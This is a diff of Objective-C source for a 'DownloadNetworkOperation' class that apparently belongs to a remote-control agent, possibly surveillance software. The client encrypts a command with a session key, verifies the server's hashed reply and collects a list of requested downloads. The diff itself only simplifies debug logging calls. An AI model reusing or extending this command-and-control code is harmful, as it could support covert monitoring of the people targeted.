@@ -17,7 +17,8 @@
 #import "NSData+Pascal.h"
 #import "RCSMTaskManager.h"
 
-//#define DEBUG_DOWN_NOP
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
 
 
 @implementation DownloadNetworkOperation
@@ -32,7 +33,7 @@
       mDownloads = [[NSMutableArray alloc] init];
       
 #ifdef DEBUG_DOWN_NOP
-      infoLog(ME, @"mTransport: %@", mTransport);
+      infoLog(@"mTransport: %@", mTransport);
 #endif
       return self;
     }
@@ -49,7 +50,7 @@
 - (BOOL)perform
 {
 #ifdef DEBUG_DOWN_NOP
-  infoLog(ME, @"");
+  infoLog(@"");
 #endif
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -62,7 +63,7 @@
   [commandData appendData: commandSha];
   
 #ifdef DEBUG_DOWN_NOP
-  infoLog(ME, @"commandData: %@", commandData);
+  infoLog(@"commandData: %@", commandData);
 #endif
   
   [commandData encryptWithKey: gSessionKey];
@@ -81,7 +82,7 @@
   [replyDecrypted decryptWithKey: gSessionKey];
   
 #ifdef DEBUG_DOWN_NOP
-  infoLog(ME, @"replyDecrypted: %@", replyDecrypted);
+  infoLog(@"replyDecrypted: %@", replyDecrypted);
 #endif
   
   [replyDecrypted getBytes: &command
@@ -106,7 +107,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_DOWN_NOP
-      errorLog(ME, @"exception on sha makerange (%@)", [e reason]);
+      errorLog(@"exception on sha makerange (%@)", [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -119,14 +120,14 @@
   shaLocal = [shaLocal sha1Hash];
   
 #ifdef DEBUG_DOWN_NOP
-  infoLog(ME, @"shaRemote: %@", shaRemote);
-  infoLog(ME, @"shaLocal : %@", shaLocal);
+  infoLog(@"shaRemote: %@", shaRemote);
+  infoLog(@"shaLocal : %@", shaLocal);
 #endif
   
   if ([shaRemote isEqualToData: shaLocal] == NO)
     {
 #ifdef DEBUG_DOWN_NOP
-      errorLog(ME, @"sha mismatch");
+      errorLog(@"sha mismatch");
 #endif
       
       [replyDecrypted release];
@@ -139,7 +140,7 @@
   if (command != PROTO_OK)
     {
 #ifdef DEBUG_DOWN_NOP
-      errorLog(ME, @"No download request available (command %d)", command);
+      errorLog(@"No download request available (command %d)", command);
 #endif
       
       [replyDecrypted release];
@@ -158,7 +159,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_AUTH_NOP
-      errorLog(ME, @"exception on numOfStrings makerange (%@)", [e reason]);
+      errorLog(@"exception on numOfStrings makerange (%@)", [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -169,13 +170,13 @@
     }
   
 #ifdef DEBUG_DOWN_NOP
-  infoLog(ME, @"downloads available: %d", numOfStrings);
+  infoLog(@"downloads available: %d", numOfStrings);
 #endif
   
   if (numOfStrings == 0)
     {
 #ifdef DEBUG_DOWN_NOP
-      errorLog(ME, @"numOfStrings is zero!");
+      errorLog(@"numOfStrings is zero!");
 #endif
       
       [replyDecrypted release];
@@ -197,7 +198,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_DOWN_NOP
-      errorLog(ME, @"exception on stringDataSize makerange (%@)", [e reason]);
+      errorLog(@"exception on stringDataSize makerange (%@)", [e reason]);
 #endif
       
       return NO;
@@ -220,7 +221,7 @@
       @catch (NSException *e)
         {
 #ifdef DEBUG_DOWN_NOP
-          errorLog(ME, @"exception on stringData makerange (%@)", [e reason]);
+          errorLog(@"exception on stringData makerange (%@)", [e reason]);
 #endif
           
           [replyDecrypted release];
@@ -235,7 +236,7 @@
       if (string == nil)
         {
 #ifdef DEBUG_DOWN_NOP
-          errorLog(ME, @"string is empty, error on unpascalize");
+          errorLog(@"string is empty, error on unpascalize");
 #endif
           
           [replyDecrypted release];
@@ -246,7 +247,7 @@
         }
       
 #ifdef DEBUG_DOWN_NOP
-      infoLog(ME, @"string: %@", string);
+      infoLog(@"string: %@", string);
 #endif
       
       [mDownloads addObject: string];
@@ -260,7 +261,7 @@
       @catch (NSException *e)
         {
 #ifdef DEBUG_DOWN_NOP
-          errorLog(ME, @"exception on replaceBytes makerange (%@)", [e reason]);
+          errorLog(@"exception on replaceBytes makerange (%@)", [e reason]);
 #endif
           
           [replyDecrypted release];
